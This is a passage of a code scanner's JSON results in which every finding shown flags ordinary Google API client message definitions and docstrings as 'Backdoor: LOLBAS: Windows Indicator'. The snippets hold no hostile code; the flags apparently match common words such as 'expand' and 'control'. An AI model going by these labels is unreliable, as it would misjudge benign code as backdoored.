                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2838,
                  "startColumn": 1,
                  "endLine": 2838,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n  category = _messages.StringField(1)\n  consumerProjectId = _messages.StringField(2)\n  expand = _messages.StringField(3)\n  pageSize = _messages.IntegerField(4, variant=_messages.Variant.INT32)\n  pageToken = _messages.StringField(5)\n  producerProjectId = _messages.StringField(6)\n",
                    "rendered": {
                      "text": "\n  category = _messages.StringField(1)\n  consumerProjectId = _messages.StringField(2)\n  expand = _messages.StringField(3)\n  pageSize = _messages.IntegerField(4, variant=_messages.Variant.INT32)\n  pageToken = _messages.StringField(5)\n  producerProjectId = _messages.StringField(6)\n",
                      "markdown": "`\n  category = _messages.StringField(1)\n  consumerProjectId = _messages.StringField(2)\n  expand = _messages.StringField(3)\n  pageSize = _messages.IntegerField(4, variant=_messages.Variant.INT32)\n  pageToken = _messages.StringField(5)\n  producerProjectId = _messages.StringField(6)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2826,
                  "startColumn": 21,
                  "endLine": 2826,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    consumerProjectId: Include services consumed by the specified project.  If\n      project_settings is expanded, then this field controls which project\n      project_settings is populated for.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not fully included in list results: - `operations` -\n      `project_settings` - `project_settings.operations` - `quota_usage` (It\n      requires `project_settings`)\n",
                    "rendered": {
                      "text": "    consumerProjectId: Include services consumed by the specified project.  If\n      project_settings is expanded, then this field controls which project\n      project_settings is populated for.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not fully included in list results: - `operations` -\n      `project_settings` - `project_settings.operations` - `quota_usage` (It\n      requires `project_settings`)\n",
                      "markdown": "`    consumerProjectId: Include services consumed by the specified project.  If\n      project_settings is expanded, then this field controls which project\n      project_settings is populated for.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not fully included in list results: - `operations` -\n      `project_settings` - `project_settings.operations` - `quota_usage` (It\n      requires `project_settings`)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2811,
                  "startColumn": 1,
                  "endLine": 2811,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    ALL = 3\n\n  consumerProjectId = _messages.StringField(1)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                    "rendered": {
                      "text": "    ALL = 3\n\n  consumerProjectId = _messages.StringField(1)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                      "markdown": "`    ALL = 3\n\n  consumerProjectId = _messages.StringField(1)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2784,
                  "startColumn": 21,
                  "endLine": 2784,
                  "endColumn": 29,
                  "snippet": {
                    "text": "  Fields:\n    consumerProjectId: If project_settings is expanded, return settings for\n      the specified consumer project.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `project_settings` -\n      `project_settings.operations` - `quota_usage` (It requires\n      `project_settings`) - `historical_quota_usage` (It requires\n",
                    "rendered": {
                      "text": "  Fields:\n    consumerProjectId: If project_settings is expanded, return settings for\n      the specified consumer project.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `project_settings` -\n      `project_settings.operations` - `quota_usage` (It requires\n      `project_settings`) - `historical_quota_usage` (It requires\n",
                      "markdown": "`  Fields:\n    consumerProjectId: If project_settings is expanded, return settings for\n      the specified consumer project.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `project_settings` -\n      `project_settings.operations` - `quota_usage` (It requires\n      `project_settings`) - `historical_quota_usage` (It requires\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2684,
                  "startColumn": 1,
                  "endLine": 2684,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    ALL = 3\n\n  customerId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                    "rendered": {
                      "text": "    ALL = 3\n\n  customerId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                      "markdown": "`    ALL = 3\n\n  customerId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2662,
                  "startColumn": 21,
                  "endLine": 2662,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    customerId: ID for the customer. See the comment for\n      `CustomerSettings.customer_id` field of message for its format. This\n      field is required.\n    expand: Fields to expand in any results.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`. This\n      field is required.\n",
                    "rendered": {
                      "text": "    customerId: ID for the customer. See the comment for\n      `CustomerSettings.customer_id` field of message for its format. This\n      field is required.\n    expand: Fields to expand in any results.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`. This\n      field is required.\n",
                      "markdown": "`    customerId: ID for the customer. See the comment for\n      `CustomerSettings.customer_id` field of message for its format. This\n      field is required.\n    expand: Fields to expand in any results.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`. This\n      field is required.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2482,
                  "startColumn": 1,
                  "endLine": 2482,
                  "endColumn": 10,
                  "snippet": {
                    "text": "  billing = _messages.MessageField('Billing', 4)\n  configVersion = _messages.IntegerField(5, variant=_messages.Variant.UINT32)\n  context = _messages.MessageField('Context', 6)\n  control = _messages.MessageField('Control', 7)\n  customError = _messages.MessageField('CustomError', 8)\n  documentation = _messages.MessageField('Documentation', 9)\n  enums = _messages.MessageField('Enum', 10, repeated=True)\n",
                    "rendered": {
                      "text": "  billing = _messages.MessageField('Billing', 4)\n  configVersion = _messages.IntegerField(5, variant=_messages.Variant.UINT32)\n  context = _messages.MessageField('Context', 6)\n  control = _messages.MessageField('Control', 7)\n  customError = _messages.MessageField('CustomError', 8)\n  documentation = _messages.MessageField('Documentation', 9)\n  enums = _messages.MessageField('Enum', 10, repeated=True)\n",
                      "markdown": "`  billing = _messages.MessageField('Billing', 4)\n  configVersion = _messages.IntegerField(5, variant=_messages.Variant.UINT32)\n  context = _messages.MessageField('Context', 6)\n  control = _messages.MessageField('Control', 7)\n  customError = _messages.MessageField('CustomError', 8)\n  documentation = _messages.MessageField('Documentation', 9)\n  enums = _messages.MessageField('Enum', 10, repeated=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2453,
                  "startColumn": 25,
                  "endLine": 2453,
                  "endColumn": 29,
                  "snippet": {
                    "text": "      This is required by the Service.monitoring and Service.logging\n      configurations.\n    monitoring: Monitoring configuration of the service.\n    name: The DNS address at which this service is available, e.g.\n      `calendar.googleapis.com`.\n    producerProjectId: The id of the Google developer project that owns the\n      service. Members of this project can manage the service configuration,\n",
                    "rendered": {
                      "text": "      This is required by the Service.monitoring and Service.logging\n      configurations.\n    monitoring: Monitoring configuration of the service.\n    name: The DNS address at which this service is available, e.g.\n      `calendar.googleapis.com`.\n    producerProjectId: The id of the Google developer project that owns the\n      service. Members of this project can manage the service configuration,\n",
                      "markdown": "`      This is required by the Service.monitoring and Service.logging\n      configurations.\n    monitoring: Monitoring configuration of the service.\n    name: The DNS address at which this service is available, e.g.\n      `calendar.googleapis.com`.\n    producerProjectId: The id of the Google developer project that owns the\n      service. Members of this project can manage the service configuration,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2434,
                  "startColumn": 42,
                  "endLine": 2434,
                  "endColumn": 51,
                  "snippet": {
                    "text": "      to determine defaults. This is documented together with applicable\n      options. The current default for the config version itself is `3`.\n    context: Context configuration.\n    control: Configuration for the service control plane.\n    customError: Custom error configuration.\n    documentation: Additional API documentation.\n    enums: A list of all enum types included in this API service.  Enums\n",
                    "rendered": {
                      "text": "      to determine defaults. This is documented together with applicable\n      options. The current default for the config version itself is `3`.\n    context: Context configuration.\n    control: Configuration for the service control plane.\n    customError: Custom error configuration.\n    documentation: Additional API documentation.\n    enums: A list of all enum types included in this API service.  Enums\n",
                      "markdown": "`      to determine defaults. This is documented together with applicable\n      options. The current default for the config version itself is `3`.\n    context: Context configuration.\n    control: Configuration for the service control plane.\n    customError: Custom error configuration.\n    documentation: Additional API documentation.\n    enums: A list of all enum types included in this API service.  Enums\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2401,
                  "startColumn": 31,
                  "endLine": 2401,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n  \"\"\"\n\n  endTime = _messages.StringField(1)\n",
                    "rendered": {
                      "text": "    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n  \"\"\"\n\n  endTime = _messages.StringField(1)\n",
                      "markdown": "`    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n  \"\"\"\n\n  endTime = _messages.StringField(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2395,
                  "startColumn": 55,
                  "endLine": 2395,
                  "endColumn": 59,
                  "snippet": {
                    "text": "\n\nclass QuotaUsage(_messages.Message):\n  r\"\"\"Specifies the used quota amount for a quota limit at a particular time.\n\n  Fields:\n    endTime: The time the quota duration ended.\n",
                    "rendered": {
                      "text": "\n\nclass QuotaUsage(_messages.Message):\n  r\"\"\"Specifies the used quota amount for a quota limit at a particular time.\n\n  Fields:\n    endTime: The time the quota duration ended.\n",
                      "markdown": "`\n\nclass QuotaUsage(_messages.Message):\n  r\"\"\"Specifies the used quota amount for a quota limit at a particular time.\n\n  Fields:\n    endTime: The time the quota duration ended.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2096,
                  "startColumn": 41,
                  "endLine": 2096,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\nclass QuotaLimit(_messages.Message):\n  r\"\"\"`QuotaLimit` defines a specific limit that applies over a specified\n  duration for a limit type. There can be at most one limit for a duration and\n  limit type combination defined within a `QuotaGroup`.\n\n  Enums:\n",
                    "rendered": {
                      "text": "\nclass QuotaLimit(_messages.Message):\n  r\"\"\"`QuotaLimit` defines a specific limit that applies over a specified\n  duration for a limit type. There can be at most one limit for a duration and\n  limit type combination defined within a `QuotaGroup`.\n\n  Enums:\n",
                      "markdown": "`\nclass QuotaLimit(_messages.Message):\n  r\"\"\"`QuotaLimit` defines a specific limit that applies over a specified\n  duration for a limit type. There can be at most one limit for a duration and\n  limit type combination defined within a `QuotaGroup`.\n\n  Enums:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2003,
                  "startColumn": 25,
                  "endLine": 2003,
                  "endColumn": 29,
                  "snippet": {
                    "text": "  Note that One Platform enforces per-second limits averaged over a duration\n  of 100 seconds. The rules map ReadGroup for all methods, except for the\n  Update and Delete methods. These two methods consume from WriteGroup, with\n  Update method consuming at twice the rate as Delete method.  Multiple quota\n  groups can be specified for a method. The quota limits in all of those\n  groups will be enforced. Example:      quota:       groups:       - name:\n  WriteGroup         limits:         - description: Daily Limit\n",
                    "rendered": {
                      "text": "  Note that One Platform enforces per-second limits averaged over a duration\n  of 100 seconds. The rules map ReadGroup for all methods, except for the\n  Update and Delete methods. These two methods consume from WriteGroup, with\n  Update method consuming at twice the rate as Delete method.  Multiple quota\n  groups can be specified for a method. The quota limits in all of those\n  groups will be enforced. Example:      quota:       groups:       - name:\n  WriteGroup         limits:         - description: Daily Limit\n",
                      "markdown": "`  Note that One Platform enforces per-second limits averaged over a duration\n  of 100 seconds. The rules map ReadGroup for all methods, except for the\n  Update and Delete methods. These two methods consume from WriteGroup, with\n  Update method consuming at twice the rate as Delete method.  Multiple quota\n  groups can be specified for a method. The quota limits in all of those\n  groups will be enforced. Example:      quota:       groups:       - name:\n  WriteGroup         limits:         - description: Daily Limit\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2003,
                  "startColumn": 1,
                  "endLine": 2003,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  Note that One Platform enforces per-second limits averaged over a duration\n  of 100 seconds. The rules map ReadGroup for all methods, except for the\n  Update and Delete methods. These two methods consume from WriteGroup, with\n  Update method consuming at twice the rate as Delete method.  Multiple quota\n  groups can be specified for a method. The quota limits in all of those\n  groups will be enforced. Example:      quota:       groups:       - name:\n  WriteGroup         limits:         - description: Daily Limit\n",
                    "rendered": {
                      "text": "  Note that One Platform enforces per-second limits averaged over a duration\n  of 100 seconds. The rules map ReadGroup for all methods, except for the\n  Update and Delete methods. These two methods consume from WriteGroup, with\n  Update method consuming at twice the rate as Delete method.  Multiple quota\n  groups can be specified for a method. The quota limits in all of those\n  groups will be enforced. Example:      quota:       groups:       - name:\n  WriteGroup         limits:         - description: Daily Limit\n",
                      "markdown": "`  Note that One Platform enforces per-second limits averaged over a duration\n  of 100 seconds. The rules map ReadGroup for all methods, except for the\n  Update and Delete methods. These two methods consume from WriteGroup, with\n  Update method consuming at twice the rate as Delete method.  Multiple quota\n  groups can be specified for a method. The quota limits in all of those\n  groups will be enforced. Example:      quota:       groups:       - name:\n  WriteGroup         limits:         - description: Daily Limit\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2002,
                  "startColumn": 1,
                  "endLine": 2002,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  ReadGroup and WriteGroup, each defining its own daily and per-second limits.\n  Note that One Platform enforces per-second limits averaged over a duration\n  of 100 seconds. The rules map ReadGroup for all methods, except for the\n  Update and Delete methods. These two methods consume from WriteGroup, with\n  Update method consuming at twice the rate as Delete method.  Multiple quota\n  groups can be specified for a method. The quota limits in all of those\n  groups will be enforced. Example:      quota:       groups:       - name:\n",
                    "rendered": {
                      "text": "  ReadGroup and WriteGroup, each defining its own daily and per-second limits.\n  Note that One Platform enforces per-second limits averaged over a duration\n  of 100 seconds. The rules map ReadGroup for all methods, except for the\n  Update and Delete methods. These two methods consume from WriteGroup, with\n  Update method consuming at twice the rate as Delete method.  Multiple quota\n  groups can be specified for a method. The quota limits in all of those\n  groups will be enforced. Example:      quota:       groups:       - name:\n",
                      "markdown": "`  ReadGroup and WriteGroup, each defining its own daily and per-second limits.\n  Note that One Platform enforces per-second limits averaged over a duration\n  of 100 seconds. The rules map ReadGroup for all methods, except for the\n  Update and Delete methods. These two methods consume from WriteGroup, with\n  Update method consuming at twice the rate as Delete method.  Multiple quota\n  groups can be specified for a method. The quota limits in all of those\n  groups will be enforced. Example:      quota:       groups:       - name:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1966,
                  "startColumn": 43,
                  "endLine": 1966,
                  "endColumn": 47,
                  "snippet": {
                    "text": "  r\"\"\"Quota configuration helps to achieve fairness and budgeting in service\n  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n  term quota limits   that are usually defined over a time window of one or\n",
                    "rendered": {
                      "text": "  r\"\"\"Quota configuration helps to achieve fairness and budgeting in service\n  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n  term quota limits   that are usually defined over a time window of one or\n",
                      "markdown": "`  r\"\"\"Quota configuration helps to achieve fairness and budgeting in service\n  usage.  - Fairness is achieved through the use of short-term quota limits\n  that are usually defined over a time window of several seconds or   minutes.\n  When such a limit is applied, for example at the user   level, it ensures\n  that no single user will monopolize the service   or a given customer's\n  allocated portion of it. - Budgeting is achieved through the use of long-\n  term quota limits   that are usually defined over a time window of one or\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1838,
                  "startColumn": 37,
                  "endLine": 1838,
                  "endColumn": 46,
                  "snippet": {
                    "text": "      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n  \"\"\"\n\n",
                      "markdown": "`      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1836,
                  "startColumn": 32,
                  "endLine": 1836,
                  "endColumn": 41,
                  "snippet": {
                    "text": "      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n",
                    "rendered": {
                      "text": "      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n",
                      "markdown": "`      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n    usageSettings: Settings that control whether this service is usable by the\n      consumer project.\n    visibilitySettings: Settings that control which features of the service\n      are visible to the consumer project.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1832,
                  "startColumn": 32,
                  "endLine": 1832,
                  "endColumn": 41,
                  "snippet": {
                    "text": "      a string key to a google.protobuf.ListValue proto. Values in the list\n      are typed as defined in the Service configuration's consumer.properties\n      field.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n",
                    "rendered": {
                      "text": "      a string key to a google.protobuf.ListValue proto. Values in the list\n      are typed as defined in the Service configuration's consumer.properties\n      field.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n",
                      "markdown": "`      a string key to a google.protobuf.ListValue proto. Values in the list\n      are typed as defined in the Service configuration's consumer.properties\n      field.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer project.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1816,
                  "startColumn": 19,
                  "endLine": 1816,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n\nclass ProjectSettings(_messages.Message):\n  r\"\"\"Settings that control how a consumer project uses a service.\n\n  Messages:\n    PropertiesValue: Service-defined per-consumer properties.  A key-value\n",
                    "rendered": {
                      "text": "\n\nclass ProjectSettings(_messages.Message):\n  r\"\"\"Settings that control how a consumer project uses a service.\n\n  Messages:\n    PropertiesValue: Service-defined per-consumer properties.  A key-value\n",
                      "markdown": "`\n\nclass ProjectSettings(_messages.Message):\n  r\"\"\"Settings that control how a consumer project uses a service.\n\n  Messages:\n    PropertiesValue: Service-defined per-consumer properties.  A key-value\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
